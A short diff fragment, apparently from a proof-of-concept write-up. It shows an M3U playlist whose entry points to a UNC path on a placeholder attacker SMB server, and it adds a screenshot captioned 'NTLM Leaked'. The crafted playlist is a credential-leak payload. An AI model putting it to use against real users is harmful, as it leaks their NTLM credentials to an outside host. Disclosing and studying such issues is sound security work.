@@ -28,6 +28,7 @@ PoC :
 #EXTM3U
 #EXTINF:-1,leak_it_please
 \\attacker_smb_server\xFolder
+![Alt text](/Screenshot from 2019-05-04 08-11-15.png?raw=true "NTLM Leaked")
 
 Save it as m3u extention.
 
